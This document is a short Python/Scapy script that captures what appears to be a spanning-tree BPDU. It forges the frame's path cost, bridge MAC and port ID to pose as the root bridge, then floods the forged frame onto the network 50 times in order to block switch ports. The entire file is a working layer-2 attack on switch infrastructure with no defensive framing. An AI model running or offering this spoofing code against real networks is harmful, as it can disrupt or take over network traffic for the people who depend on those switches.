from scapy.all import *
import time


#Block port to switch

pkt = sniff(filter="ether dst 01:02:03:04:05:06",count=1)
#Block port to root switch
#set cost to root to zero
pkt[0].pathcost=0
#set bridge MAC to root brige
pkt[0].bridgemac = pkt[0].rootmac
#set port ID to 1
pkt[0].portid =1
#Loop to send multiple BPDUs packets
for i in range(0,50):
    pkt[0].show()
    sendp(pkt[0],loop=0,verbose=1)
    time.sleep(1)
